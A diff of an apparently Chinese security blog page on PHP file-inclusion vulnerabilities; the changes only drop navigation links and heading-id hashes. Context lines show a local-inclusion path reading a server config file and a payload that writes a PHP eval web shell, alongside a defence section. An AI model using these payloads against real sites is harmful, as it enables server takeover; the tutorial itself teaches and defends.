@@ -53,24 +53,6 @@
     </h1>
     <ul class="nav">
         
-            
-                <li>
-                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
-            
-                </li>
-        
     </ul>
 </div>
 
@@ -115,7 +97,7 @@
                 
                 
 
-<h3 id="0x00-文件包含:c2c3b21f0f1167d1fc29c58d3ff7516b">0x00 文件包含</h3>
+<h3 id="0x00-文件包含">0x00 文件包含</h3>
 
 <blockquote>
 <pre><code>  程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，
@@ -128,7 +110,7 @@
 </code></pre>
 </blockquote>
 
-<h3 id="0x01-常见文件包含函数:c2c3b21f0f1167d1fc29c58d3ff7516b">0x01 常见文件包含函数</h3>
+<h3 id="0x01-常见文件包含函数">0x01 常见文件包含函数</h3>
 
 <blockquote>
 <pre><code>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行
@@ -137,7 +119,7 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 </code></pre>
 </blockquote>
 
-<h3 id="0x02-利用条件:c2c3b21f0f1167d1fc29c58d3ff7516b">0x02 利用条件</h3>
+<h3 id="0x02-利用条件">0x02 利用条件</h3>
 
 <ul>
 <li>程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件</li>
@@ -150,7 +132,7 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 </code></pre>
 </blockquote>
 
-<h3 id="0x03-漏洞危害:c2c3b21f0f1167d1fc29c58d3ff7516b">0x03 漏洞危害</h3>
+<h3 id="0x03-漏洞危害">0x03 漏洞危害</h3>
 
 <blockquote>
 <pre><code>执行任意代码
@@ -159,7 +141,7 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 </code></pre>
 </blockquote>
 
-<h3 id="0x04-漏洞分类:c2c3b21f0f1167d1fc29c58d3ff7516b">0x04 漏洞分类</h3>
+<h3 id="0x04-漏洞分类">0x04 漏洞分类</h3>
 
 <blockquote>
 <pre><code>本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码
@@ -174,14 +156,14 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 </code></pre>
 </blockquote>
 
-<h3 id="0x05-漏洞挖掘:c2c3b21f0f1167d1fc29c58d3ff7516b">0x05 漏洞挖掘</h3>
+<h3 id="0x05-漏洞挖掘">0x05 漏洞挖掘</h3>
 
 <blockquote>
 <pre><code>上AWVS吧，骚年...
 </code></pre>
 </blockquote>
 
-<h3 id="0x06-本地包含:c2c3b21f0f1167d1fc29c58d3ff7516b">0x06 本地包含</h3>
+<h3 id="0x06-本地包含">0x06 本地包含</h3>
 
 <ul>
 <li>示例一</li>
@@ -408,7 +390,7 @@ index.php?page=/etc/httpd/conf/httpd.conf
 </code></pre>
 </blockquote>
 
-<h3 id="0x07-远程包含:c2c3b21f0f1167d1fc29c58d3ff7516b">0x07 远程包含</h3>
+<h3 id="0x07-远程包含">0x07 远程包含</h3>
 
 <blockquote>
 <p>注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
@@ -420,7 +402,7 @@ index.php?page=/etc/httpd/conf/httpd.conf
 若在a.txt写入&lt;?php fputs(fopen(&ldquo;shell.php&rdquo;,&ldquo;w&rdquo;),&rdquo;&lt;?php @eval($_POST[xxx]); ?&gt;&ldquo;) ?&gt;，可直接写shell</p>
 </blockquote>
 
-<h3 id="0x08-漏洞防御:c2c3b21f0f1167d1fc29c58d3ff7516b">0x08 漏洞防御</h3>
+<h3 id="0x08-漏洞防御">0x08 漏洞防御</h3>
 
 <blockquote>
 <pre><code>PHP中使用open_basedir配置，将访问限制在指定区域
